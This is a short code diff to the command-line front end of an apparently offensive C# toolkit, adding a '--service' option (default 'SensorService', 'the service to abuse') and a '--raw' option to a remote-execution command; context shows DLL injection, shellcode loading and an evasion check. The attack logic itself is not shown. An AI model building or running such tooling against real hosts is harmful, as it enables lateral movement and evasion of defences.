@@ -33,9 +33,15 @@ var dllCommand = new Command("dll", "Injects and runs DLL"){
 
 var hostnameArg = new Argument<string>("hostname", "The hostname to connect to");
 var cmdArg = new Argument<string>("cmd", "The command to execute");
+var serviceNameOption = new Option<string>("--service", "The service to abuse");
+serviceNameOption.SetDefaultValue("SensorService");
+var rawCmdOption = new Option<bool>("--raw", "Execute the command without prepending cmd.exe /c");
+
 var remoteExecCommand = new Command("rexec", "Executes a command on a remote host"){
     hostnameArg,
-    cmdArg
+    cmdArg,
+    serviceNameOption,
+    rawCmdOption
 };
 
 
@@ -48,7 +54,7 @@ rootCommand.AddCommand(scCommand);
 rootCommand.AddCommand(dllCommand);
 rootCommand.AddCommand(remoteExecCommand);
 
-remoteExecCommand.SetHandler(async (host, cmd, skipEvasion, debug) =>
+remoteExecCommand.SetHandler(async (host, cmd, skipEvasion, debug, service, raw) =>
 {
     if (!skipEvasion && EvasionCheck.Detected)
     {
@@ -56,8 +62,8 @@ remoteExecCommand.SetHandler(async (host, cmd, skipEvasion, debug) =>
         Environment.Exit(0);
     }
 
-    await RemoteExecution.Run(host, cmd, debug: debug);
-}, hostnameArg, cmdArg, skipEvasionOption, debugOption);
+    await RemoteExecution.Run(host, cmd, serviceName: service, debug: debug, rawCmd: raw);
+}, hostnameArg, cmdArg, skipEvasionOption, debugOption, serviceNameOption, rawCmdOption);
 
 scCommand.SetHandler(async (url, method, skipEvasion, debug, wait) =>
 {
